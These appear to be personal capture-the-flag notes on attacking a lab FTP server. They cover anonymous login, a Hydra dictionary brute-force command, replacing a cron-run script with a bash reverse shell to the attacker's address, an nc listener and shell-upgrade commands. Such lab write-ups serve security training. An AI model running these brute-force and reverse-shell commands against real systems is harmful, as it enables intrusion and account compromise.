------------------------------------------------------------------------------------------------------------------------------------------------------------------
ENUMERATION
------------------------------------------------------------------------------------------------------------------------------------------------------------------
Method
We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell 
on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.

Alternative Enumeration Methods
It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories
which exist and those that donâ€™t. This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more 
than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP.
------------------------------------------------------------------------------------------------------------------------------------------------------------------
EXPLOIT
------------------------------------------------------------------------------------------------------------------------------------------------------------------
Types of FTP Exploit

Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.
With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as 
passwords).
When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations. 

Method 
So, from our enumeration stage, we know:
    - There is an FTP server running on this machine
    - We have a possible username

Using this information, let's try and bruteforce the password of the FTP Server.
---------------------------------------------------------------------------
Hydra
---------------------------------------------------------------------------
Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP,
HTTP, HTTPS, SMB, several databases and much more. 

The syntax for the command we're going to use to find the passwords is this:

"hydra -t 4 -l chris -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"

Let's break it down:

SECTION                   FUNCTION
---------------           ------------------
hydra                     Runs the hydra tool
-t 4                      Number of parallel connections per target
-l [user]                 Points to the user who's account you're trying to compromise
-P [path to dictionary]   Points to the file containing the list of possible passwords
-vV                       Sets verbose mode to very verbose, shows the login+pass combination for each attempt
[machine IP]              The IP address of the target machine
ftp / protocol            Sets the protocolEnumeration
---------------------------------------------------------------------------
FTP retrieve commands
---------------------------------------------------------------------------
ftp> prompt off
ftp> mget *
----------------------------------------------------------------------------------------------------------------------------------------------------------------
FTP Anonymous Login          .sh found being executed w/ cron job    Get SHELL, upgrade SHELL, ESCALATE w/ LinPEAS
----------------------------------------------------------------------------------------------------------------------------------------------------------------
1.) Found clean.sh that is being rn as a cron job
                a.) replace the clean.sh w/ 
                                                #!/bin/bash
                                                bash -i >& /dev/tcp/[Your-IP-Address]/[PORT] 0>&1
                b.) change clean.sh to be executeable 
                c.) chmod +x clean.sh
                
2.) Set listnener on attacker computer
              nc -lvnp [Same-Port-as-reverse-shell]

3.) log into ftp anf put file
              put clean.sh
              
...wait for cron job to run the backdoor...             

4.) Upgrade nc SHELL
              a.) python -c 'import pty;pty.spawn("/bin/bash")'
              b.) export TERM=xterm-256-color
              c.) CTRL + Z
              d.) stty raw -echo
              e.) fg
              
5.)              

---------------------------------------------------------------------------------------------------------------------------------------------------------------
